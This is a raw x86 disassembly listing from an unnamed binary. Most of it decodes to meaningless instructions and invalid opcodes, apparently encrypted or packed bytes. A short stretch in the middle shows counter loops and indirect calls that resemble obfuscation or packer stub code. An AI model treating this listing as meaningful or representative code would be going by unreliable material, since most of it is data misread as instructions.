  40a980:	inc    esi
  40a981:	dec    edi
  40a982:	lahf   
  40a983:	or     al,0xdf
  40a985:	jmp    0xfbc75c04
  40a98a:	jae    0x40aa02
  40a98c:	fidiv  WORD PTR [ebp+0x57]
  40a98f:	mov    dh,0x7d
  40a991:	jp     0x40a93b
  40a993:	pop    esi
  40a994:	cmc    
  40a995:	push   ss
  40a996:	adc    bl,BYTE PTR [eax-0x45]
  40a999:	js     0x40a967
  40a99b:	rcl    BYTE PTR [ecx],0x8d
  40a99e:	popf   
  40a99f:	and    ecx,DWORD PTR [ebp-0x1ac73af6]
  40a9a5:	or     eax,ecx
  40a9a7:	mov    ebx,0x965f2b5a
  40a9ac:	fwait
  40a9ad:	gs inc esp
  40a9af:	in     eax,0x58
  40a9b1:	mov    ebp,0xaaf8da4b
  40a9b6:	jb     0x40a9ce
  40a9b8:	jl     0x40a9f5
  40a9ba:	hlt    
  40a9bb:	or     BYTE PTR [eax],0x62
  40a9be:	xchg   esi,eax
  40a9bf:	and    BYTE PTR [ebx],ah
  40a9c1:	mov    ebp,0xd0486015
  40a9c6:	push   0xb80bdb31
  40a9cb:	and    eax,0xa48d28c1
  40a9d0:	dec    ebp
  40a9d1:	add    eax,edi
  40a9d3:	das    
  40a9d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9d5:	adc    BYTE PTR [ebx],bl
  40a9d7:	loopne 0x40a9bb
  40a9d9:	sahf   
  40a9da:	enter  0x2092,0x51
  40a9de:	sbb    eax,0x1eebe18a
  40a9e3:	shr    BYTE PTR [ebx],cl
  40a9e5:	faddp  st(0),st
  40a9e7:	out    0x89,al
  40a9e9:	out    dx,al
  40a9ea:	ret    
  40a9eb:	xchg   edi,eax
  40a9ec:	jne    0x40aa14
  40a9ee:	adc    dl,al
  40a9f0:	inc    esp
  40a9f1:	cmp    eax,0xe71477cb
  40a9f6:	jp     0x40a9ec
  40a9f8:	test   eax,0x615450d7
  40a9fd:	js     0x40aa64
  40a9ff:	ret    0x52dd
  40aa02:	idiv   DWORD PTR [edx]
  40aa04:	mov    dh,0x47
  40aa06:	push   edi
  40aa07:	call   0xb6c:0x5bfc4082
  40aa0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa0f:	jmp    0x9d2f:0x5b6a724c
  40aa16:	or     ch,BYTE PTR [edx]
  40aa18:	or     edx,DWORD PTR [edi+0x6c04f54]
  40aa1e:	cmp    al,0xcb
  40aa20:	lahf   
  40aa21:	jno    0x40a9f7
  40aa23:	pusha  
  40aa24:	push   ds
  40aa25:	test   eax,0x54f1579f
  40aa2a:	int3   
  40aa2b:	xchg   BYTE PTR [edx-0x72],al
  40aa2e:	inc    ebp
  40aa2f:	repz adc DWORD PTR [ebp-0x61],eax
  40aa33:	or     eax,0x38862601
  40aa38:	aas    
  40aa39:	xor    al,0xa
  40aa3b:	int3   
  40aa3c:	pop    ebx
  40aa3d:	sbb    DWORD PTR [eax+0x6e],edx
  40aa40:	out    0x5e,eax
  40aa42:	xchg   esp,eax
  40aa43:	pop    esp
  40aa44:	add    ah,dl
  40aa46:	mov    esp,0xdf7ebb7e
  40aa4b:	and    eax,0x410c22b
  40aa50:	or     DWORD PTR [edi+0x400aa669],ebp
  40aa56:	mov    ds,ebp
  40aa58:	ret    
  40aa59:	mov    dl,0xdd
  40aa5b:	clc    
  40aa5c:	gs nop
  40aa5e:	ins    BYTE PTR es:[edi],dx
  40aa5f:	xchg   edi,eax
  40aa60:	mov    WORD PTR [esi],?
  40aa62:	push   esi
  40aa63:	(bad)  
  40aa64:	cmp    DWORD PTR [ebx],esi
  40aa66:	add    eax,0x2eeb917d
  40aa6b:	imul   ebx,DWORD PTR [edx-0x65d9efbb],0xffffff82
  40aa72:	jo     0x40aad5
  40aa74:	call   0x7f30:0x126d060b
  40aa7b:	push   esi
  40aa7c:	ins    BYTE PTR es:[edi],dx
  40aa7d:	xchg   BYTE PTR [edx-0xef4a296],ch
  40aa83:	sbb    al,0x77
  40aa85:	ret    
  40aa86:	rol    DWORD PTR [edx+0x57],1
  40aa89:	inc    edx
  40aa8a:	cwde   
  40aa8b:	jg     0x40aaec
  40aa8d:	and    eax,0x5f152b26
  40aa92:	inc    esi
  40aa93:	xor    DWORD PTR [edx],esi
  40aa95:	in     al,0x23
  40aa97:	hlt    
  40aa98:	outs   dx,DWORD PTR ds:[esi]
  40aa99:	mov    bl,0x17
  40aa9b:	int    0xcf
  40aa9d:	fisubr WORD PTR [edx]
  40aa9f:	es push eax
  40aaa1:	rol    eax,cl
  40aaa3:	into   
  40aaa4:	mov    ebx,0x37ec3dd4
  40aaa9:	test   BYTE PTR [esi-0x70],dl
  40aaac:	cld    
  40aaad:	mov    edx,0xfcb03e88
  40aab2:	dec    edi
  40aab3:	sahf   
  40aab4:	cmp    cl,BYTE PTR [ecx+0x5ce22975]
  40aaba:	sbb    ebx,DWORD PTR [ecx]
  40aabc:	inc    edx
  40aabd:	or     DWORD PTR ds:0x49e273ec,edx
  40aac3:	imul   esp,DWORD PTR [esi-0x5d1e0c11],0xffffffac
  40aaca:	or     DWORD PTR [esp+ecx*4+0x33396edc],eax
  40aad1:	inc    ebp
  40aad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad3:	adc    BYTE PTR [edx],ah
  40aad5:	cmp    ebp,DWORD PTR [edi-0x5293458e]
  40aadb:	xor    cl,ah
  40aadd:	enter  0xb8b4,0xe4
  40aae1:	scas   eax,DWORD PTR es:[edi]
  40aae2:	adc    ebx,DWORD PTR [edi+esi*8+0x46425f5d]
  40aae9:	mov    BYTE PTR [ebp+0x1b],0xd5
  40aaed:	dec    esi
  40aaee:	ret    
  40aaef:	cld    
  40aaf0:	stc    
  40aaf1:	ins    BYTE PTR es:[edi],dx
  40aaf2:	popa   
  40aaf3:	loopne 0x40aaa9
  40aaf5:	xor    al,0x4
  40aaf7:	je     0x40ab21
  40aaf9:	popa   
  40aafa:	lods   eax,DWORD PTR ds:[esi]
  40aafb:	add    edi,esi
  40aafd:	add    BYTE PTR [ecx+0x41059f23],ah
  40ab03:	and    DWORD PTR [eax+0x59],edx
  40ab06:	loop   0x40ab82
  40ab08:	and    ah,0x89
  40ab0b:	mov    ebx,0x288f98f
  40ab10:	mov    ah,0x50
  40ab12:	sub    dl,0xaa
  40ab15:	or     al,0x96
  40ab17:	in     al,0x83
  40ab19:	ins    DWORD PTR es:[edi],dx
  40ab1a:	mov    DWORD PTR [edi+0x3ad5a902],esi
  40ab20:	ret    0x1d47
  40ab23:	enter  0x21cd,0x92
  40ab27:	push   DWORD PTR [esi-0x4d2da5ac]
  40ab2d:	xor    dh,dl
  40ab2f:	push   ecx
  40ab30:	pop    eax
  40ab31:	sub    eax,0x864dee78
  40ab36:	test   al,0xa4
  40ab38:	and    esp,DWORD PTR [edx+0xa]
  40ab3b:	call   0x8b356608
  40ab40:	lea    ebx,[ecx]
  40ab42:	shl    ah,0xad
  40ab45:	test   esi,ecx
  40ab47:	cli    
  40ab48:	into   
  40ab49:	in     eax,0x6c
  40ab4b:	ret    
  40ab4c:	dec    ebp
  40ab4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab4e:	or     DWORD PTR [ebp+0x57],ebp
  40ab51:	mov    edi,0xd0cfbadb
  40ab56:	ret    
  40ab57:	stc    
  40ab58:	mov    bh,0xf8
  40ab5a:	push   ds
  40ab5b:	scas   al,BYTE PTR es:[edi]
  40ab5c:	adc    BYTE PTR [edi+0x61c21059],dl
  40ab62:	mov    dl,0x98
  40ab64:	jno    0x40ab8e
  40ab66:	jo     0x40ab78
  40ab68:	adc    DWORD PTR [ebp+0x45],eax
  40ab6b:	pushf  
  40ab6c:	sub    eax,0x9b472f21
  40ab71:	mov    ebx,0x6816e569
  40ab76:	stc    
  40ab77:	fild   DWORD PTR [edx+esi*4+0x1d]
  40ab7b:	inc    edi
  40ab7c:	or     bl,BYTE PTR [esi]
  40ab7e:	aas    
  40ab7f:	adc    eax,DWORD PTR ds:0xd2e2c47f
  40ab85:	out    dx,al
  40ab86:	sub    bl,al
  40ab88:	shl    DWORD PTR [ecx-0x6a],1
  40ab8b:	addr16 pop esp
  40ab8d:	inc    esp
  40ab8e:	mov    dh,0x57
  40ab90:	jne    0x40abff
  40ab92:	or     eax,0xbbc5a539
  40ab97:	xchg   ebx,eax
  40ab98:	in     al,0x7b
  40ab9a:	jnp    0x40ab93
  40ab9c:	mov    cl,0x9d
  40ab9e:	and    ecx,eax
  40aba0:	fwait
  40aba1:	and    al,0xed
  40aba3:	aaa    
  40aba4:	xchg   ebx,eax
  40aba5:	icebp  
  40aba6:	mov    ah,0xff
  40aba8:	and    BYTE PTR [eax+ecx*8+0x67d87411],bl
  40abaf:	aam    0x21
  40abb1:	mov    edx,cs
  40abb3:	lods   al,BYTE PTR ds:[esi]
  40abb4:	pop    edi
  40abb5:	or     BYTE PTR [ecx+0x71eaa52b],ah
  40abbb:	(bad)  
  40abbc:	jmp    0x40abdb
  40abbe:	xchg   edi,eax
  40abbf:	mov    ecx,0x5f690d42
  40abc4:	push   eax
  40abc5:	inc    ebp
  40abc6:	(bad)  
  40abc7:	mov    bl,0x20
  40abc9:	inc    ecx
  40abca:	out    dx,al
  40abcb:	inc    ebp
  40abcc:	in     al,dx
  40abcd:	or     eax,0x66e9ffb5
  40abd2:	stc    
  40abd3:	int3   
  40abd4:	mov    esi,DWORD PTR ds:0x7fed2aa6
  40abda:	jae    0x40ac1c
  40abdc:	jg     0x40ac0f
  40abde:	adc    eax,0xa5a50e25
  40abe3:	(bad)  
  40abe4:	fmul   st(6),st
  40abe6:	fs pop eax
  40abe8:	and    ch,BYTE PTR [ecx-0x5b330973]
  40abee:	cmp    ecx,DWORD PTR [eax+0x26]
  40abf1:	popf   
  40abf2:	mov    ds:0x3dc15723,al
  40abf7:	rcl    BYTE PTR [ecx],1
  40abf9:	mov    ebp,gs
  40abfb:	mov    ch,0x28
  40abfd:	test   DWORD PTR [edi-0x2b],ecx
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fd75,0x42e78f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e783,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fd5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fdfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fd75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e777,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e777,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e777,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e2bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e373
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e777
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e777,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e1a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e1a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e1a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e1a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e377
  40acd5:	cmp    DWORD PTR ds:0x42e1a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e1a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e1b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fd61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fd61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fd61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd81
  40ad3c:	call   DWORD PTR ds:0x42e5cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fd61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fd61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ae1e
  40adb4:	mov    cs,esi
  40adb6:	ds add edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad97
  40adc0:	cdq    
  40adc1:	push   ecx
  40adc2:	cli    
  40adc3:	aas    
  40adc4:	jg     0x40add1
  40adc6:	jno    0x40add0
  40adc8:	or     BYTE PTR [edi-0x5367cfdf],dh
  40adce:	sbb    al,0xbb
  40add0:	ret    0x42f4
  40add3:	sahf   
  40add4:	sbb    esi,DWORD PTR [ebx]
  40add6:	mov    bh,0xd7
  40add8:	pop    edx
  40add9:	ins    BYTE PTR es:[edi],dx
  40adda:	xlat   BYTE PTR ds:[ebx]
  40addb:	clc    
  40addc:	jecxz  0x40ad73
  40adde:	ret    
  40addf:	lahf   
  40ade0:	idiv   BYTE PTR [ecx-0x722de15b]
  40ade6:	(bad)  
  40ade7:	je     0x40ae4c
  40ade9:	je     0x40adc1
  40adeb:	mov    dl,al
  40aded:	push   ebp
  40adee:	adc    al,0x6b
  40adf0:	sti    
  40adf1:	fsubrp st(2),st
  40adf3:	mov    ah,cl
  40adf5:	jo     0x40ae53
  40adf7:	inc    esp
  40adf8:	adc    ah,BYTE PTR [ebp-0x2c]
  40adfb:	cmp    eax,0x828105db
  40ae00:	pop    ebp
  40ae01:	ins    BYTE PTR es:[edi],dx
  40ae02:	pop    ebx
  40ae03:	stos   DWORD PTR es:[edi],eax
  40ae04:	ret    
  40ae05:	xor    al,0xe1
  40ae07:	jge    0x40ae7a
  40ae09:	cdq    
  40ae0a:	call   0x9bb1a8
  40ae0f:	pop    ds
  40ae10:	ja     0x40ad95
  40ae12:	inc    edx
  40ae13:	bound  ecx,QWORD PTR [edi]
  40ae15:	aad    0x97
  40ae17:	push   ss
  40ae18:	out    0x0,eax
  40ae1a:	test   al,0xb3
  40ae1c:	dec    esp
  40ae1d:	inc    ebp
  40ae1e:	xlat   BYTE PTR ds:[ebx]
  40ae1f:	ss push esp
  40ae21:	nop
  40ae22:	div    DWORD PTR [eax]
  40ae24:	ins    DWORD PTR es:[edi],dx
  40ae25:	ret    
  40ae26:	shl    BYTE PTR [edx],1
  40ae28:	jo     0x40ae32
  40ae2a:	inc    ebx
  40ae2b:	pop    esi
  40ae2c:	rol    ch,0xe8
  40ae2f:	or     al,BYTE PTR [ebx+edi*8-0x40]
  40ae33:	mov    dl,0xce
  40ae35:	dec    edi
  40ae36:	xchg   DWORD PTR ds:0x9970fbac,ebx
  40ae3c:	pusha  
  40ae3d:	test   BYTE PTR [ecx+0x3],bl
  40ae40:	std    
  40ae41:	jae    0x40aebe
  40ae43:	dec    esi
  40ae44:	sbb    dl,bh
  40ae46:	pop    esp
  40ae47:	jne    0x40adff
  40ae49:	xor    BYTE PTR [ebx+0x231b5721],0xd0
  40ae50:	xor    eax,0x8a26afb7
  40ae55:	cdq    
  40ae56:	mov    cs,WORD PTR [ebp-0xa77c370]
  40ae5c:	fst    DWORD PTR [eax+0x3ab91bd2]
  40ae62:	mov    edx,0x137d46ae
  40ae67:	aas    
  40ae68:	int3   
  40ae69:	imul   ecx,DWORD PTR [eax],0xffffffed
  40ae6c:	mov    esp,0x9768b2e2
  40ae71:	cld    
  40ae72:	push   esi
  40ae73:	and    eax,0x5164ab38
  40ae78:	jmp    0x37bba6ab
  40ae7d:	push   es
  40ae7e:	into   
  40ae7f:	or     esi,edi
  40ae81:	fidiv  WORD PTR [ecx]
  40ae83:	sbb    eax,0xc8470ca9
  40ae88:	cmc    
  40ae89:	mov    edi,0x2fa32128
  40ae8e:	push   si
  40ae90:	stos   DWORD PTR es:[edi],eax
  40ae91:	mov    ecx,0xdaf58e23
  40ae96:	inc    edx
  40ae97:	sbb    eax,0x46c01d85
  40ae9c:	dec    edx
  40ae9d:	adc    DWORD PTR [esi+0x15698519],ecx
  40aea3:	addr16 xchg ebp,eax
  40aea5:	mov    ebp,0x2fbc2fa6
  40aeaa:	ret    0x4838
  40aead:	inc    eax
  40aeae:	push   ebp
  40aeaf:	(bad)  
  40aeb0:	fldenv [esi-0x76]
  40aeb3:	mov    ch,ch
  40aeb5:	push   esp
  40aeb6:	push   ds
  40aeb7:	(bad)  
  40aeb8:	cmp    edx,eax
  40aeba:	ficomp WORD PTR [edi-0x7aa6d5a5]
  40aec0:	sbb    bh,BYTE PTR [eax+0x5dcfe82b]
  40aec6:	or     ah,dh
  40aec8:	lds    edi,FWORD PTR [ecx+0x21]
  40aecb:	push   esp
  40aecc:	lahf   
  40aecd:	mov    bl,0xfd
  40aecf:	pop    ds
  40aed0:	je     0x40af42
  40aed2:	test   esp,0x228ca0f4
  40aed8:	mov    ebx,0x275dd838
  40aedd:	pop    esp
  40aede:	dec    ebx
  40aedf:	out    dx,eax
  40aee0:	not    DWORD PTR [ebx-0x7e]
  40aee3:	outs   dx,BYTE PTR ds:[esi]
  40aee4:	push   esi
  40aee5:	test   DWORD PTR [eax+0x6e],esp
  40aee8:	in     al,dx
  40aee9:	(bad)  
  40aeea:	out    0x7d,eax
  40aeec:	retf   
  40aeed:	stos   DWORD PTR es:[edi],eax
  40aeee:	jmp    0xceec:0xf9b3aa47
  40aef5:	or     al,bh
  40aef7:	jae    0x40af20
  40aef9:	inc    eax
  40aefa:	out    0x9d,al
  40aefc:	test   eax,0x7e9a5f32
  40af01:	cmp    DWORD PTR [eax-0x5b70c815],edx
  40af07:	jmp    FWORD PTR [ecx+0x7d]
  40af0a:	int    0x9e
  40af0c:	mov    eax,ds:0x4d6e3c39
  40af11:	mov    ebx,0x3459e8ac
  40af16:	inc    edx
  40af17:	push   cs
  40af18:	jne    0x40aef4
  40af1a:	sub    ah,dh
  40af1c:	cli    
  40af1d:	dec    ecx
  40af1e:	ins    DWORD PTR es:[edi],dx
  40af1f:	out    0xd2,al
  40af21:	pop    edx
  40af22:	test   BYTE PTR [edi-0x7a],bh
  40af25:	scas   eax,DWORD PTR es:[edi]
  40af26:	mov    eax,ds:0x4f46f867
  40af2b:	mov    eax,ds:0x78d7d5e1
  40af30:	inc    ecx
  40af31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af32:	fsub   DWORD PTR [esi+ecx*2]
  40af35:	ret    0x7d7a
  40af38:	sub    al,0xf9
  40af3a:	mov    cl,0xcb
  40af3c:	jg     0x40aede
  40af3e:	fstp   DWORD PTR [ecx]
  40af40:	into   
  40af41:	add    eax,0x7a38405
  40af46:	push   edi
  40af47:	jne    0x40af2a
  40af49:	daa    
  40af4a:	adc    DWORD PTR [edi],0xb84b2091
  40af50:	cmp    al,0x0
  40af52:	hlt    
  40af53:	push   esi
  40af54:	dec    edx
  40af55:	fld    TBYTE PTR [esi]
  40af57:	test   eax,0x1859ff9f
  40af5c:	inc    ecx
  40af5d:	out    0x99,al
  40af5f:	or     esp,esp
  40af61:	out    0xb1,eax
  40af63:	or     al,0x5b
  40af65:	js     0x40af1c
  40af67:	lods   eax,DWORD PTR ds:[esi]
  40af68:	jle    0x40af00
  40af6a:	xchg   BYTE PTR [edi],bh
  40af6c:	xor    esp,edx
  40af6e:	jp     0x40af8b
  40af70:	je     0x40af0e
  40af72:	xor    ah,bl
  40af74:	jg     0x40af5c
  40af76:	arpl   WORD PTR [ebp+0x6c],cx
  40af79:	xor    bl,BYTE PTR ds:0x10e55789
  40af7f:	icebp  
  40af80:	adc    DWORD PTR [edi+0x6c4bbdf7],0xffffffaa
  40af87:	sbb    ebp,edi
  40af89:	aas    
  40af8a:	ins    DWORD PTR es:[edi],dx
  40af8b:	rcl    BYTE PTR [ebp+0x49],0x91
  40af8f:	sbb    al,0xb3
  40af91:	dec    esi
  40af92:	xchg   edi,eax
  40af93:	sbb    esi,DWORD PTR [ecx]
  40af95:	dec    ebx
  40af97:	mov    ds:0x3ddb8a29,al
  40af9c:	rcl    ebp,cl
  40af9e:	pusha  
  40af9f:	inc    ecx
  40afa0:	add    cl,BYTE PTR [ecx]
  40afa2:	aas    
  40afa3:	jae    0x40af64
  40afa5:	add    esp,DWORD PTR [ebx-0x34]
  40afa8:	adc    ah,BYTE PTR [ecx-0x1323c79]
  40afae:	jmp    0x40afcb
  40afb0:	imul   edi,esp,0xeb95049c
  40afb6:	lods   al,BYTE PTR ds:[esi]
  40afb7:	inc    eax
  40afb8:	rol    DWORD PTR [ebp+edx*8+0x28],1
  40afbc:	add    eax,0xa6b88c35
  40afc1:	test   DWORD PTR [ebx],ebx
  40afc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc4:	and    edx,ecx
  40afc6:	inc    eax
  40afc7:	xchg   ecx,eax
  40afc8:	dec    ebp
  40afc9:	sub    DWORD PTR [esp+esi*8-0x3c],edx
  40afcd:	call   0x6576:0xde40b36f
  40afd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afd5:	sub    al,0x91
  40afd7:	dec    esi
  40afd8:	test   al,0x7b
  40afda:	loopne 0x40af81
  40afdc:	es cdq 
  40afde:	cmp    ebp,DWORD PTR [esi]
  40afe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afe1:	inc    eax
  40afe2:	adc    esp,DWORD PTR [ebp+0x1ea17c99]
  40afe8:	(bad)  [edx-0x2f]
  40afeb:	outs   dx,BYTE PTR ds:[esi]
  40afec:	test   DWORD PTR [ebp-0x1db6a806],eax
  40aff2:	test   al,0xcb
  40aff4:	pusha  
  40aff5:	daa    
  40aff6:	mov    ch,0x17
  40aff8:	dec    eax
  40aff9:	add    ah,dl
  40affb:	popa   
  40affc:	push   es
  40affd:	add    dh,dh
  40afff:	dec    ebx
  40b000:	out    dx,eax
  40b001:	fist   DWORD PTR [edi-0x73b615e2]
  40b007:	ins    BYTE PTR es:[edi],dx
  40b008:	mov    bh,0x7f
  40b00a:	push   DWORD PTR [edx]
  40b00c:	cwde   
  40b00d:	mov    WORD PTR [ebx],ds
  40b00f:	xlat   BYTE PTR ds:[ebx]
  40b010:	call   0x680b5950
  40b015:	imul   ecx,DWORD PTR [eax+0x3ce7d540],0xba1251d6
  40b01f:	cmp    esp,DWORD PTR [ebp-0x5c]
  40b022:	jmp    0x40b066
  40b024:	sub    al,0x83
  40b026:	mov    ecx,0x8e7378be
  40b02b:	loope  0x40b015
  40b02d:	xchg   edx,eax
  40b02e:	cmp    esi,DWORD PTR [edx+0x52]
  40b031:	mov    dh,0x13
  40b033:	shl    DWORD PTR [ecx+0x17],cl
  40b036:	sar    BYTE PTR [ebp+0x1e],cl
  40b039:	fbld   TBYTE PTR [ecx]
  40b03b:	(bad)  
  40b03c:	mov    edx,0x7ed8430b
  40b041:	and    ecx,eax
  40b043:	mov    ch,0xf4
  40b045:	xchg   al,cl
  40b047:	aas    
  40b048:	shr    DWORD PTR [edx],1
  40b04a:	sbb    eax,DWORD PTR [edi+0x4d5a159e]
  40b050:	cdq    
  40b051:	dec    eax
  40b052:	imul   ecx,DWORD PTR [ebx],0xffffffb0
  40b055:	test   BYTE PTR [eax],bl
  40b057:	xor    bl,dl
  40b059:	rcr    BYTE PTR ds:0x39ec9596,cl
  40b05f:	sbb    DWORD PTR [esi],ecx
  40b061:	push   eax
  40b062:	pop    ss
  40b063:	jns    0x40b07b
  40b065:	jno    0x40b0e3
  40b067:	lds    esi,FWORD PTR [ebp+0x6]
  40b06a:	loop   0x40b00c
  40b06c:	xchg   esi,eax
  40b06d:	lahf   
  40b06e:	inc    esp
  40b06f:	mov    eax,0x98a94943
  40b074:	xchg   BYTE PTR [edi+0x73],cl
  40b077:	add    ebx,DWORD PTR [esi-0x74]
  40b07a:	jb     0x40b07b
  40b07c:	xchg   edi,eax
  40b07d:	sbb    bl,BYTE PTR [esi+0x3f]
  40b080:	daa    
  40b081:	push   DWORD PTR [edx-0x32]
  40b084:	xchg   DWORD PTR ds:0x312cb40,ebx
  40b08a:	retf   
  40b08b:	inc    esp
  40b08c:	sub    BYTE PTR [ecx-0xc0aead2],dh
  40b092:	fbstp  TBYTE PTR [edi]
  40b094:	bound  edi,QWORD PTR [esi+0x615e26ad]
  40b09a:	and    DWORD PTR ds:0xa5629599,ebp
  40b0a0:	mov    edx,0x3a838d9c
  40b0a5:	loop   0x40b0b1
  40b0a7:	add    esi,DWORD PTR es:[edi-0x28f34f36]
  40b0ae:	xchg   ecx,eax
  40b0af:	sbb    eax,0xfa8be56c
  40b0b4:	jbe    0x40b0a5
  40b0b6:	push   edi
  40b0b7:	punpcklbw mm0,DWORD PTR [edx-0x5a01f66b]
  40b0be:	aad    0x5e
  40b0c0:	adc    eax,0xa0cc8bd8
  40b0c5:	imul   ebp,ecx,0xfffffff9
  40b0c8:	inc    esp
  40b0c9:	push   0x94f435df
  40b0ce:	jno    0x40b0b7
  40b0d0:	inc    esp
  40b0d1:	dec    DWORD PTR es:[ecx+ebx*1]
  40b0d5:	push   edi
  40b0d6:	or     DWORD PTR [esp+eax*1+0x4aec4907],ebp
  40b0dd:	pop    ebx
  40b0de:	jns    0x40b0de
  40b0e0:	inc    ebx
  40b0e1:	clc    
  40b0e2:	(bad)  
  40b0e3:	jp     0x40b06d
  40b0e5:	sub    edi,eax
  40b0e7:	or     edi,ecx
  40b0e9:	outs   dx,BYTE PTR ds:[esi]
  40b0ea:	xor    al,BYTE PTR [edi-0x1a]
  40b0ed:	in     eax,dx
  40b0ee:	pop    ecx
  40b0ef:	retf   0x4419
  40b0f2:	add    ebp,DWORD PTR [ebp+0x7b]
  40b0f5:	fidiv  DWORD PTR [edx-0x16]
  40b0f8:	fs data16 mov bl,0xb6
  40b0fc:	jl     0x40b169
  40b0fe:	and    dh,BYTE PTR ds:0x6b15f92b
  40b104:	mov    dl,0xd6
  40b106:	ins    BYTE PTR es:[edi],dx
  40b107:	add    al,0x43
  40b109:	push   esp
  40b10a:	mov    eax,DWORD PTR [ebx+0x370e1df6]
  40b110:	cmc    
  40b111:	aaa    
  40b112:	in     eax,dx
  40b113:	mov    DWORD PTR [ecx+eiz*8-0x5b1949f1],esp
  40b11a:	imul   ecx,DWORD PTR [eax+esi*2-0x4],0xffffffaa
  40b11f:	cmc    
  40b120:	mov    eax,ds:0x4860eab6
  40b125:	or     ebp,edx
  40b127:	rsm    
  40b129:	mov    edi,edi
  40b12b:	inc    esi
  40b12c:	add    ebx,DWORD PTR [ebx-0x50]
  40b12f:	fisttp WORD PTR [ebx-0x6460f685]
  40b135:	test   BYTE PTR [eax+0x7d],dl
  40b138:	retf   0xf801
  40b13b:	inc    edx
  40b13c:	xchg   ebp,eax
  40b13d:	pusha  
  40b13e:	maxps  xmm1,XMMWORD PTR [edx+ecx*8+0x33eca804]
  40b146:	fisub  WORD PTR [esi+0x10c4947]
  40b14c:	inc    esp
  40b14d:	aam    0x2b
  40b14f:	dec    edi
  40b150:	es repz push edx
  40b153:	mov    al,0x60
  40b155:	mov    ebx,0x4032de40
  40b15a:	repz mov dl,0x89
  40b15d:	das    
  40b15e:	jne    0x40b16d
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
